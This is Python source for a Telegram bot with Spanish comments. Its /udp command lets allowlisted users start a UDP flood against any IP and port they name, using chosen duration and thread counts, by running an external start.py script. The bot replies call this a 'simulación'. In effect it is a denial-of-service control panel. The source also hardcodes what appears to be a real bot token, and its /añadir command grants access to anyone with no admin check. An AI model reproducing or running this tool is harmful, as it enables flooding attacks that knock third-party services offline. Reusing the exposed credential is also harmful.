from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
import subprocess
import os

# Token del bot (obtén el token de @BotFather en Telegram)
TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"

# Archivo que contiene los IDs de usuarios con acceso
USUARIOS_TXT = "usuarios.txt"
USUARIOS_TXT = 5986416702
# Comando /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("¡Comenzar!", callback_data="start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("¡Bienvenido al bot! Usa /help para ver los comandos disponibles.", reply_markup=reply_markup)

# Callback para el botón
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("¡Gracias por interactuar con el bot! Usa /help para más información.")

# Verificar si el usuario tiene acceso
def verificar_acceso(user_id: int) -> bool:
    if not os.path.exists(USUARIOS_TXT):
        with open(USUARIOS_TXT, "w") as f:
            pass
    with open(USUARIOS_TXT, "r") as f:
        usuarios = f.read().splitlines()
    return str(user_id) in usuarios

# Comando para iniciar un ataque UDP
async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not verificar_acceso(user_id):
        await update.message.reply_text("No tienes acceso a este comando. Contacta al administrador.")
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
        )
        return

    target = context.args[0]
    duration = context.args[1]
    threads = context.args[2]

    command = f"python3 start.py UDP {target} {duration} {threads}"

    try:
        subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.message.reply_text(
            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
        )
    except Exception as e:
        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")

# Comando para añadir usuarios al archivo de acceso
async def añadir(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Uso: /añadir <ID de usuario>")
        return

    nuevo_id = context.args[0]
    if not nuevo_id.isdigit():
        await update.message.reply_text("Por favor, proporciona un ID de usuario válido.")
        return

    with open(USUARIOS_TXT, "a+") as f:
        f.seek(0)
        usuarios = f.read().splitlines()
        if nuevo_id in usuarios:
            await update.message.reply_text("Este usuario ya tiene acceso.")
            return
        f.write(f"{nuevo_id}\n")
    
    await update.message.reply_text(f"El usuario con ID {nuevo_id} ahora tiene acceso al comando /udp.")

# Configuración principal del bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Handlers de comandos
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("udp", udp_attack))
    application.add_handler(CommandHandler("añadir", añadir))
    application.add_handler(CallbackQueryHandler(handle_callback))

    # Inicia el bot
    application.run_polling()

if __name__ == "__main__":
    main()
